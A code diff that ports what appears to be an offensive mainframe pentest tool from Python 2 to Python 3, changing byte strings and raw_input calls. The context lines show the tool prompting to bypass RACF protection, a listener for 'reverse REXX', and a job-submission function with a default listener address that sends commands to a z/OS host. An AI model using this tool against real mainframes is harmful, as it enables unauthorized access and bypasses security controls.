@@ -85,25 +85,25 @@ class EmulatorIntermediate(Emulator):
 
         def send_enter(self): # Allow a delay to be configured
 
-                self.exec_command(b'Enter')
+                self.exec_command('Enter')
                 if self.delay > 0:
                         sleep(self.delay)
 
         def send_clear(self): # Allow a delay to be configured
-                self.exec_command(b'Clear')
+                self.exec_command('Clear')
                 if self.delay > 0:
                         sleep(self.delay)
 
         def send_eraseEOF(self): # Allow a delay to be configured
-                self.exec_command(b'EraseEOF')
+                self.exec_command('EraseEOF')
                 if self.delay > 0:
                         sleep(self.delay)
 
         def send_pf11(self):
-                self.exec_command(b'PF(11)')
+                self.exec_command('PF(11)')
 
         def screen_get(self):
-                response = self.exec_command(b'Ascii()')
+                response = self.exec_command('Ascii()')
                 if ''.join(response.data).strip() == "":
                     sleep(0.5)
                     return self.screen_get()
@@ -157,7 +157,7 @@ class EmulatorIntermediate(Emulator):
                 # This is then what we are looking for
 
                 for _ in range(0,2):
-                        response = self.exec_command(b'ReadBuffer(Ascii)')
+                        response = self.exec_command('ReadBuffer(Ascii)')
                         if ''.join(response.data).strip()=="":
                                 sleep(0.3)
                         else:
@@ -172,13 +172,13 @@ class EmulatorIntermediate(Emulator):
 
     # Get the current x3270 cursor position
         def get_pos(self):
-                results = self.exec_command(b'Query(Cursor)')
+                results = self.exec_command('Query(Cursor)')
                 row = int(results.data[0].split(' ')[0])
                 col = int(results.data[0].split(' ')[1])
                 return (row,col)
 
         def get_hostinfo(self):
-                return self.exec_command(b'Query(Host)').data[0].split(' ')
+                return self.exec_command('Query(Host)').data[0].split(' ')
 
 class ThreadListen(threading.Thread):
     """Threaded client connection for reverse REXX"""
@@ -768,7 +768,7 @@ def get_infos():
 
     if is_ceda and (not is_ceci or not is_cemt) and (not results.bypass):
         whine("CECI or CEMT are not available. Little information will be available on the system", 'err')
-        response = raw_input(bcolors.YELLOW+'[!] Try to bypass RACF protection ? Y/N [Y]: '+bcolors.ENDC)
+        response = input(bcolors.YELLOW+'[!] Try to bypass RACF protection ? Y/N [Y]: '+bcolors.ENDC)
 
         if response.upper() != "N":
             if not is_ceci and activate_supplied("CECI","DFHCOMP1","CSPK","BBBB") and query_cics(CECI,'ACquire',5):
@@ -2145,7 +2145,7 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
         for line in rexx_file:
             cmds +=line.strip() + ";"
 
-        remote_ip = raw_input(bcolors.YELLOW+'[!] IP address of the USS segment of z/OS (try the same IP as  the host ): '+bcolors.ENDC)
+        remote_ip = input(bcolors.YELLOW+'[!] IP address of the USS segment of z/OS (try the same IP as  the host ): '+bcolors.ENDC)
         clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         clientsocket.connect((remote_ip.strip(), int(results.port)))
         rc = clientsocket.send(cmds)
